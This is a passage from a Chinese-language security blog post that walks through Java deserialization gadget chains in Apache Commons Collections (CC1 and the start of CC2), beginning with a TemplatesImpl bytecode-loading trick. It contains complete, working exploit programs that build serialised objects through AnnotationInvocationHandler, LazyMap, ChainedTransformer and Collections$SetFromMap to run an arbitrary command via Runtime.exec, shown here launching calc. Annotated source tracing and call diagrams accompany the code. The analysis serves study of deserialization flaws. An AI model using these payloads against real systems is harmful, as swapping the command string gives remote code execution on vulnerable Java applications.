class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成恶意java字节码</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化templates并通过反射赋值</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">        <span class="comment">//templates.getOutputProperties();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>由于 <code>TemplatesImpl</code> 类本身是可以序列化的，因此以上的 <code>payload</code> 也是可以用来 <code>反序列化</code> 。 </p>
<h2 id="CC链"><a href="#CC链" class="headerlink" title="- CC链 -"></a>- CC链 -</h2><p>注意啦注意啦，重点来了(啪嗒啪嗒…)。</p>
<h3 id="CC1"><a href="#CC1" class="headerlink" title="- CC1 -"></a>- CC1 -</h3><p>实验环境：</p>
<ul>
<li><code>jdk1.7.0_02</code></li>
<li><code>commons.collections 3.2.0</code></li>
</ul>
<h4 id="调用结构"><a href="#调用结构" class="headerlink" title="- 调用结构 -"></a>- 调用结构 -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">	👇</span><br><span class="line">	(Map)Proxy.entrySet()</span><br><span class="line">	👇</span><br><span class="line">	(Map)Proxy.invoke() &lt;=&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">		👇</span><br><span class="line">		LazyMap.get()</span><br><span class="line">		👇</span><br><span class="line">		ChainedTransformer.transform()</span><br><span class="line">		👇</span><br><span class="line">		ConstantTransformer.transform() =&gt; Runtime.<span class="keyword">class</span> </span><br><span class="line">        👇</span><br><span class="line">        InvokerTransformer.transform() =&gt; Runtime.getRuntime</span><br><span class="line">        👇</span><br><span class="line">        InvokerTransformer.transform() =&gt; Runtime.getRuntime()</span><br><span class="line">        👇</span><br><span class="line">        InvokerTransformer.tarnsform() =&gt; Runtime.getRuntime().<span class="built_in">exec</span>()</span><br><span class="line">		</span><br></pre></td></tr></table></figure>
<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="- 分析 -"></a>- 分析 -</h4><p>显然后半部分即为有关 <code>Transformer</code> 的调用 <code>payload</code> 了，而使用有关 <code>Transformer</code> 的调用 <code>payload</code> 触发的重点是找到 <code>[(Transformer)可控].transform()</code> 的结构。</p>
<p>先看 <code>LazyMap</code> 类的 <code>get</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150520725.png" alt="image-20220215052011650"></p>
<p>这里 <code>Object value = this.factory.transform(key)</code> 中 <code>this.factory</code> 属性的值是可以通过序列化控制的，且类型为 <code>Tranformer</code> 接口👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150521816.png" alt="image-20220215052144739"></p>
<p>注意看 <code>LazyMap</code> 这个类还实现了 <code>Map</code> 接口。</p>
<p>那么现在的关注点就来到了寻找 <code>[可控].get()</code> 的结构，直接跟进 <code>AnnotationInvocationHandler</code> 类👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150527234.png" alt="image-20220215052715091"></p>
<p>可见 <code>AnnotationInvocationHandler</code> 类是实现了 <code>InvocationHandler</code> 接口，且可通过序列化控制 <code>memberValues</code> 属性的值。而 <code>memberValues</code> 属性的类型为 <code>Map</code> ，也就可以通过将 <code>LazyMap</code> 赋值给它从而实现控制，并且在 <code>invoke</code> 方法中存在对 <code>this.memberValues.get(var4)</code> 的调用。</p>
<p>假若用 <code>AnnotationInvocationHandler</code> 类构造一个合适的代理，当这个代理被调用时也就会由 <code>this.memberValues.get(var4)</code> 至 <code>Object value = this.factory.transform(key)</code>，进而触发有关 <code>Transformer</code> 调用的 <code>payload</code>  。</p>
<p>接下来的关键点也就来到了如何找到一个 <code>[(Map)可控].[任意方法]</code> 的结构，而在 <code>AnnotationInvocationHandler</code> 的 <code>readObject</code> 中刚好就有一个👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150536765.png" alt="image-20220215053653640"></p>
<p>相当于 <code>[(Map)可控].entrySet()</code> 的调用。</p>
<p>此时也就可以大致理解这个 <code>CC1</code> 链条的构成了，只是还有一点需要注意的是， <code>this.type</code> 这里会进行处理👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150547965.png" alt="image-20220215054741875"></p>
<p>而 <code>this.type</code> 属性类型为 <code>Class&lt;? extends Annotation&gt;</code> ，像 <code>Documented</code> 之类的注解类就可以通过了。 </p>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="- payload -"></a>- payload -</h4><p>核心应该是在于有关代理的构造，简单来说就是需要实例化两个 <code>AnnotationInvocationHandler</code> 类👇</p>
<ul>
<li>第一个 <code>AnnotationInvocationHandler</code> 类作为 <code>Map</code> 类型的代理，其 <code>memberValues</code> 属性存放相关 <code>Transformer</code> 的调用 <code>payload</code> 。</li>
<li>第二个 <code>AnnotationInvocationHandler</code> 类作为 <code>反序列化</code> 的载体，其 <code>memberValues</code> 属性存放作为代理的第一个 <code>AnnotationInvocationHandler</code> 类。</li>
</ul>
<p>以下是相关 <code>payload</code> 👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Documented;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class aih = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor aihC = aih.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihC.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成有关Transformer的payload</span></span><br><span class="line">        Map map = LazyMap.decorate(<span class="keyword">new</span> HashMap(), getTransformerChain(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第一个AnnotationInvocationHandler作为代理</span></span><br><span class="line">        InvocationHandler aihC1 = (InvocationHandler) aihC.newInstance(Documented.class, map);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(aih.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, aihC1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二个AnnotationInvocationHandler作为载体</span></span><br><span class="line">        Object aihC2 = aihC.newInstance(Documented.class, proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化测试</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(aihC2);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150651599.png" alt="image-20220215065149375"></p>
<p>是成功了。</p>
<h4 id="扩展"><a href="#扩展" class="headerlink" title="- 扩展 -"></a>- 扩展 -</h4><p>当然，除了用 <code>AnnotationInvocationHandler</code> 做载体，任何一个可以支持序列化且存在形如 <code>[(Map)可控].[任意方法]</code> 的也是可以的，比如 <code>Collections</code> 类中的 <code>SetFromMap</code> 类👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Documented;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class aih = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor aihC = aih.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihC.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成有关Transformer的payload</span></span><br><span class="line">        Map map = LazyMap.decorate(<span class="keyword">new</span> HashMap(), getTransformerChain(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第一个AnnotationInvocationHandler作为代理</span></span><br><span class="line">        InvocationHandler aihC1 = (InvocationHandler) aihC.newInstance(Documented.class, map);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(aih.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, aihC1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用Collections$SetFromMap作为载体</span></span><br><span class="line">        Class cs = Class.forName(<span class="string">&quot;java.util.Collections$SetFromMap&quot;</span>);</span><br><span class="line">        Constructor csC = cs.getDeclaredConstructor(Map.class);</span><br><span class="line">        csC.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = csC.newInstance(<span class="keyword">new</span> HashMap());</span><br><span class="line">        setFieldValue(o,<span class="string">&quot;m&quot;</span>,proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化测试</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151239158.png" alt="image-20220215123914958"></p>
<h3 id="CC2"><a href="#CC2" class="headerlink" title="- CC2 -"></a>- CC2 -</h3><p>实验环境：</p>
<ul>
<li><code>jdk1.7.0_02</code></li>
<li><code>commons.collections 4.0</code></li>
</ul>
<h4 id="调用结构-1"><a href="#调用结构-1" class="headerlink" title="- 调用结构 -"></a>- 调用结构 -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">	👇</span><br><span class="line">	PriorityQueue.heapify()</span><br><span class="line">	👇</span><br><span class="line">	PriorityQueue.siftDown()</span><br><span class="line">    👇</span><br><span class="line">    PriorityQueue.siftDownUsingComparator()</span><br><span class="line">		👇</span><br><span class="line">		TransformingComparator.compare()</span><br><span class="line">			👇</span><br><span class="line">			InvokerTransformer.transform() =&gt; TemplatesImpl.newTransformer()</span><br><span class="line">			👇</span><br><span class="line">			TemplatesImpl.newTransformer()</span><br><span class="line">            👇</span><br><span class="line">            TemplatesImpl.getTransletInstance()</span><br><span class="line">            👇</span><br><span class="line">            TemplatesImpl.defineTransletClasses()</span><br><span class="line">            👇</span><br><span class="line">            newInstance()</span><br><span class="line">		</span><br></pre></td></tr></table></figure>
<h4 id="分析-3"><a href="#分析-3" class="headerlink" title="- 分析 -"></a>- 分析 -</h4><p>从上面的 <code>调用结构</code> 可以看出，最后执行的核心部分是调用了有关 <code>TemplatesImpl</code> 的 <code>payload</code> ；而调用这个 <code>payload</code> 的关键是能够调用到 <code>TemplatesImpl</code> 类中的 <code>newTransformer</code> 方法，于是也就使用了 <code>InvokerTransformer</code> 类中可对 <code>任意类</code>  的 <code>任意方法</code> 传入 <code>任意参数</code> 的调用功能。当然，此时还必须得找一个形如 <code>[可控].transform()</code> 结构以便调用  <code>InvokerTransformer</code> 类的 <code>transform</code> 方法。</p>
<p>那么跟进 <code>TransformingComparator</code> 类👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150859741.png" alt="image-20220215085904529"></p>
<p>可见在其 <code>compare</code> 方法中存在 <code>[可控].transform()</code> 的结构，同时 <code>transformer</code> 属性可控并且可序列化(在 <code>commons.collections3</code> 中 <code>TransformingComparator</code> 类不支持序列化)。</p>
<p>由此现在的关注点就来到了如何调用 <code>TransformingComparator</code> 类的 <code>compare</code> 方法，继续跟进 <code>PriorityQueue</code> 类的 <code>siftDownUsingComparator</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150904036.png" alt="image-20220215090423964"></p>
<p>是存在对 <code>compare</code> 方法的调用的，再看 <code>comparator</code> 属性👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150905767.png" alt="image-20220215090524681"></p>
<p>依旧是可控且可序列化的，并且这个 <code>comparator</code> 属性的类型为 <code>Comparator</code> ，上面的 <code>TransformingComparator</code> 类实现了 <code>Comparator</code> 的接口，也就可以赋值为 <code>TransformingComparator</code> ，至此 <code>TransformingComparator.compare</code> 方法就有机会被调用。</p>
<p>接下来的目标也就是得到达 <code>PriorityQueue</code> 类的 <code>siftDownUsingComparator</code> 方法，从头来看 <code>PriorityQueue</code> 类的 <code>readObject</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150909930.png" alt="image-20220215090902850"></p>
<p>这里在给 <code>queue</code> 属性读取相关序列化值后，调用了 <code>heapify</code> 方法，跟进 <code>heapify</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150910840.png" alt="image-20220215091015800"> </p>
<p>如果要往下执行就必须调用 <code>siftDown</code> 方法，那么 <code>size</code> 属性的值必须至少为 <code>2</code> ，同时注意这里传入 <code>siftDown</code> 方法的参数内容为 <code>queue</code> 属性的内容，再跟进 <code>siftDown</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150912729.png" alt="image-20220215091202681"></p>
<p>在上面已经说明 <code>comparator</code> 已被赋值为 <code>TransformingComparator</code> 类，此时也就会调用 <code>siftDownUsingComparator</code> 方法，而传入的参数为 <code>heapify</code> 方法中循环的整型 <code>i</code> 以及 <code>queue[i]</code> 的值。</p>
<p>最后再跟进 <code>siftDownUsingComparator</code> 方法，看如何到达 <code>comparator</code> 属性的 <code>compare</code> 方法调用👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150917471.png" alt="image-20220215091759402"></p>
<p>此时假若通过序列化控制 <code>size</code> 属性的值为 <code>2</code> ，第一遍传入的参数也就为👇</p>
<ul>
<li><code>k = 0</code></li>
<li><code>x = queue[0]</code></li>
</ul>
<p>其中 <code>half = 1</code> ，由于 <code>k = 0</code> ，那么 <code>k &lt; half</code> 必然成立。</p>
<p>跟进循环内容，看到 <code>child = 1</code> ，<code>c = queue[1]</code> ，而 <code>right = 2</code> ，显然第一个条件也就是 <code>if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0)</code> 中是不成立的(因为 <code>right = size = 2</code> )；在第二个条件中直接以 <code>x = queue[0]</code> 和 <code>c = queue[1]</code> 作为参数调用了 <code>comparator.compare</code> ，至此就达成了目的。</p>
<p>再来看 <code>writeObject</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150929318.png" alt="image-20220215092906254"></p>
<p>可见 <code>queue</code> 属性是直接写进去了，并且由于 <code>queue</code> 属性类型为 <code>Object[]</code> ，也就可以赋予任意值，比如 <code>InvokerTransformer</code> 类是可以的。</p>
<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="- payload -"></a>- payload -</h4><p>需要注意的是除了需要 <code>commons.collections4.0</code> 版本外，只要按照以下结构构造 <code>PriorityQueue</code> 类就好了👇</p>
<ul>
<li><code>size = 2</code></li>
<li><code>comparator = TransformingComparator类</code></li>
<li><code>queue[2] = &#123;InvokerTransformer类, null&#125;</code></li>
</ul>
<p>在 <code>PriorityQueue</code> 的构造方法中仅仅是提供了有关 <code>queue</code> 长度以及 <code>comparator</code> 的构造👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150932390.png" alt="image-20220215093250330"></p>
